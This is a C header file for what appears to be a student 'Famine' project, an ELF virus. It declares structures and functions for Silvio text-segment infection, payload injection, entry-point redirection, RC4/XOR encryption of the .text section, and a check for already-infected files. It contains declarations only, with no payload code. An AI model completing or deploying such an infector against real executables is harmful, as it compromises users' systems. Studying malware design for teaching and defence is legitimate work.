/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   famine.h                                 :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mabouce <ma.sithis@gmail.com>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/07/26 12:22:18 by mabouce           #+#    #+#             */
/*   Updated: 2021/07/27 18:43:00 by mabouce          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef famine_H
#define famine_H

/****************************************************************************/
/*                          INCLUDES                                        */
/****************************************************************************/

#include <stdio.h>       // FFLUSH FPUTS PERROR
#include <stdlib.h>      // MALOC/FREE
#include <fcntl.h>       // OPEN
#include <sys/syscall.h> // SYSCALL
#include <string.h>      // STRERROR
#include <sys/mman.h>    // MMAP MUNMAP
#include <unistd.h>      // CLOSE EXIT LSEEK WRITE
#include <elf.h>         // ELF STRUCTURE
#include <errno.h>
#include <stdbool.h>
#include <sys/stat.h>

/****************************************************************************/
/*                          DEFINES                                         */
/****************************************************************************/

/* Colors */
#define END "\033[0m"
#define RED "\033[0;31m"
#define B_RED "\033[1;31m"
#define GREEN "\033[0;32m"
#define B_GREEN "\033[1;32m"
#define YELLOW "\033[0;33m"
#define B_YELLOW "\033[1;33m"
#define BLUE "\033[0;34m"
#define B_BLUE "\033[1;34m"
#define MAGENTA "\033[0;35m"
#define B_MAGENTA "\033[1;35m"
#define CYAN "\033[0;36m"
#define B_CYAN "\033[1;36m"

/* Error codes */
enum e_error
{
    ERROR_OPEN = 1,
    ERROR_READ,
    ERROR_WRITE,
    ERROR_CLOSE,
    ERROR_MALLOC,
    ERROR_INPUT_ARGUMENTS_NUMBERS,
    ERROR_LSEEK,
    ERROR_NOT_ELF,
    ERROR_NOT_ELF32,
    ERROR_NOT_ELF64,
    ERROR_MMAP,
    ERROR_NOT_A_REGULAR_FILE,
    ERROR_STAT,
    ERROR_NOT_EXECUTABLE_BINARY,
    ERROR_ELF_NOT_LITTLE_ENDIAN,
    ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD,
    ERROR_FILE_IS_ALREADY_INFECTED,
    ERROR_RET2OEP_NOT_FOUND,
    ERROR_GETENCRYPTEDSECTIONADDR_NOT_FOUND,
    ERROR_KEYSECTION_NOT_FOUND,
    ERROR_GETENCRYPTEDSECTIONSIZE_NOT_FOUND,
    ERROR_GETTEXTSECTIONADDR_NOT_FOUND,
    ERROR_GETTEXTSIZE_NOT_FOUND,
    NB_OF_ERROR_CODES /* Always keep last */
};

#define PAGE_SIZE 0x1000
#define KEY_LEN 0x80

#define OUTPUT_FILE_NAME "famine"
#define PAYLOAD_NAME "payload"

#define SECTION_TO_ENCRYPT_NAME ".text"

/* Custom types for 32bit compatibility. */
#ifdef ARCH_32

#define ARCH_64 0

/* Data types for 32bit */
typedef Elf32_Addr t_elf_addr;
typedef Elf32_Ehdr t_elf_ehdr;
typedef Elf32_Phdr t_elf_phdr;
typedef Elf32_Shdr t_elf_shdr;
typedef Elf32_Off t_elf_off;
#define size_t uint32_t

#else /* 64 bits */

// If ARCH_32 not define, define it to 0.
#define ARCH_64 1
#define ARCH_32 0

/* Data types for 64bit */
typedef Elf64_Addr t_elf_addr; // (Size 8) Unsigned program addresses
typedef Elf64_Ehdr t_elf_ehdr;
typedef Elf64_Phdr t_elf_phdr;
typedef Elf64_Shdr t_elf_shdr;
typedef Elf64_Off t_elf_off;
#define size_t uint64_t

#endif

/****************************************************************************/
/*                          STRUCTS                                         */
/****************************************************************************/

typedef struct s_famine
{
    void *mmap_ptr;
    void *string_table_ptr;
    size_t binary_data_size;

    void *payload_data;
    size_t payload_size;
    char *encryption_key;

    void *cipher;

    t_elf_ehdr *ehdr;
    t_elf_phdr *phdr;
    t_elf_shdr *shdr;
    t_elf_addr new_entry_point;
    t_elf_addr old_entry_point;
    t_elf_addr payload_vaddr;

    t_elf_off text_p_start_offset;
    t_elf_off text_p_end_offset;
    size_t text_p_size;
    t_elf_addr text_p_vaddr;
    size_t text_section_size;

    t_elf_off encrypt_s_start_offset;
    t_elf_off encrypt_s_end_offset;
    size_t encrypt_s_size;
    t_elf_addr encrypt_s_addr;

    int ret2oep_offset;

    void *infected_file;
    size_t infected_file_size;
} t_famine;

/****************************************************************************/
/*                          FUNCTIONS DEFINITIONS                           */
/****************************************************************************/

void check_elf_header(t_famine *famine);
void set_string_table_ptr(t_famine *famine);

void key_generator(t_famine *famine);
void cipher_famine_file_data(t_famine *famine);
char *rc4_cipher(t_famine *famine, char *data, int len);

void choose_infection_method(t_famine *famine);
void silvio_text_infection(t_famine *famine);

size_t find_keysection_offset_elf64(t_famine *famine);
size_t find_ret2oep_offset_elf64(t_famine *famine);
size_t find_getencryptedsectionaddr_offset_elf64(t_famine *famine);
size_t find_getencryptedsectionsize_offset_elf64(t_famine *famine);

void overwrite_payload_ret2oep(t_famine *famine);
void overwrite_payload_getencryptedsectionaddr(t_famine *famine);
void overwrite_payload_getencryptedsectionsize(t_famine *famine);
void overwrite_keysection_payload(t_famine *famine);
void overwrite_payload_gettextsectionaddr(t_famine *famine);
void overwrite_payload_gettextsize(t_famine *famine);
void load_payload(t_famine *famine, char *payload_name);

size_t find_gettextsize_offset_elf32(t_famine *famine);
size_t find_getencryptedsectionsize_offset_elf32(t_famine *famine);
size_t find_gettextsectionaddr_offset_elf32(t_famine *famine);
size_t find_getencryptedsectionaddr_offset_elf32(t_famine *famine);
size_t find_ret2oep_offset_elf32(t_famine *famine);

size_t find_getencryptedsectionaddr_offset_elf64(t_famine *famine);
size_t find_gettextsectionaddr_offset_elf64(t_famine *famine);
size_t find_getencryptedsectionsize_offset_elf64(t_famine *famine);
size_t find_gettextsize_offset_elf64(t_famine *famine);
size_t find_ret2oep_offset_elf64(t_famine *famine);

void set_famine_ptrs_to_null(t_famine *famine);
void print_famine_infos(t_famine *famine);
void print_memory_hex(void *memory_ptr, size_t memory_size);
void print_memory_char(void *memory_ptr, size_t memory_size);
void free_famine(t_famine *famine);
void error(int err, t_famine *famine);

/****************************************************************************/
/*                          ASM FUNCTIONS DEFINITIONS                       */
/****************************************************************************/

extern char *rc4_cipher_start(void *data, int datalen, char *key, int keylen);
extern char *asm_xor_cipher(char *data, int datalen, char *key, int keylen);

/****************************************************************************/
/*                          GLOBAL VARIABLES                                */
/****************************************************************************/

#endif
